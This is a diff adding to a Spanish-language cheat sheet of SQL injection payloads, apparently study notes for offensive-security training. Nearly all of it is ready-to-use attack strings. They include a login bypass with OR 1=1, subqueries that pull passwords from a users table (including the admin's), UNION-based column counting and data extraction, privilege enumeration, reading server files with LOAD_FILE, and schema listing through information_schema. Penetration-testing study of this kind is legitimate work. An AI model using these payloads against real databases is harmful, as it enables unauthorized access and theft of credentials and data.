@@ -1,10 +1,38 @@
+# Booleans
+
+### bypass login
+  
+  offsec' OR 1=1 --
+
+### Version de la tabla
+
+  ' or 1=1 in (select @@version) -- //
+
+### Extraer una columna de una tabla
+
+  ' or 1=1 in (SELECT password FROM users) -- //
+
+### Extraer datos de una columna de un registro puntual
+
+  ' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+
+# Union
+
+### ver la cantidad de columnas en la tabla
+
+  ' ORDER BY 1-- //
+
+### Extraer datos de la db
+
+  dato' UNION SELECT database(), user(), @@version, null, null -- //
+
 ### enumerar privilegios del usuario:
 SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges--
 
 ### leer un archivo del servidor
 SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
 
-## consultar tablas de una db mediante el information schema:
+### consultar tablas de una db mediante el information schema:
 select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='<db>'--
 
 select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='<table>'--
